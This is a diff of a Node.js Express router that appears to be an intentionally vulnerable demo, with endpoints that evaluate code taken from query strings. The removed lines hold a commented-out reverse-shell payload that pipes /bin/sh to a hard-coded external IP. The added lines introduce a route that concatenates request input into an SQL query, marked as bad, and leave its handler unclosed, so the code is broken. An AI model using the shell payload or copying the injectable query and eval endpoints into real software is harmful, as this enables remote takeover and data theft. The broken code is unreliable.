@@ -3,22 +3,6 @@ const vm = require('vm');
 const express = require('express');
 const router = express.Router();
 
-// http://localhost:3000/eval?args=jscode
-/* linux reverse shell
-(function(){
-    const net=require("net"),
-        cp=require("child_process"),
-        sh=cp.spawn("/bin/sh",["-i"]);
-    const client=new net.Socket();
-    client.connect(8080,"18.216.236.191", function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    });
-    return /pwned/;
-})()
-*/
-
 
 // http://localhost:3000/eval?code=this.process.env
 router.get('/eval', function(req, res) {
@@ -32,6 +16,16 @@ router.get('/vm', function(req, res) {
     res.send(result);
 });
 
+// http://localhost:3000/eval?code=this.process.env
+   
+router.get('/handle', function(req, res) {
+// BAD: the category might have SQL special characters in it
 
+var query1 = "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='"
+             + req.params.category + "' ORDER BY PRICE";
+pool.query(query1, [], function(err, results) {
+    // process results
+
+  });
 
 module.exports = router;
